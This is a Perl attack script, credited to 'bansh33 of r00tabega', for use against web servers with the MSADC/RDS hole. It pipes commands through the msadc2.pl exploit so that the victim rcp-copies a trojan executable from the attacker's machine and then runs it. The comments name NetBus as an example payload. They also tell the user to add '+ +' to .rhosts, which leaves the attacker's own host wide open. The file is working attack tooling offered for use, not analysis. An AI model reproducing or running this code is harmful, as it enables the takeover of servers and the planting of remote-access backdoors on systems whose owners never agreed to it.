#!/usr/bin/perl
# MSADC Trojan Run Script
# by bansh33 of r00tabega [bansh33@r00tabega.com]
# -- www.r00tabega.com --
#
# propz to my mommy and daddy cuz they make me drink my milk
#
# This script will upload a trojan to an RDS vulnerable site and will execute the trojan
# (as long as it runs on NT, i.e. netbus)
#
# Add "+ +" to your .rhosts file 
# (yes i know this will make you vulnerable to certain types of shit)
# and put msadc2.pl (by r.f.p, www.wiretrip.net/rfp) and the trojan exe in your home directory.


if (!($ARGV[0])) {
  print "[MSADC Trojan Run by bansh33 of r00tabega.com]\n";
  print "usage: ./msadc-trojan.pl [remote host] [local ip] [trojan filename]\n"; 
  exit;  
}

if (!($ARGV[1])) {
  print "[MSADC Trojan Run by bansh33 of r00tabega.com]\n";
  print "usage: ./msadc-trojan.pl $ARGV[0] [local ip] [trojan filename]\n"; 
  exit; 
}

if (!($ARGV[2])) {
  print "[MSADC Trojan Run by bansh33 of r00tabega.com]\n";
  print "usage: ./msadc-trojan.pl $ARGV[0] $ARGV[1] [trojan filename]\n"; 
  exit; 
}

open(RHOST, "| ./msadc2.pl -h $ARGV[0]");
print RHOST "rcp -b $ARGV[1].$ENV{'USER'}:$ENV{'HOME'}/$ARGV[2] .\n";
close RHOST;

sleep 7;

open(RHOST, "| ./msadc2.pl -h $ARGV[0]");
print RHOST "$ARGV[2]\n";
close RHOST;

print "done. uploaded and ran $ARGV[2].  If all went well, you should be able to use the trojan to connect.\n";
print " - www.r00tabega.com - \n";
#EOF [r00tabega.security.labs]

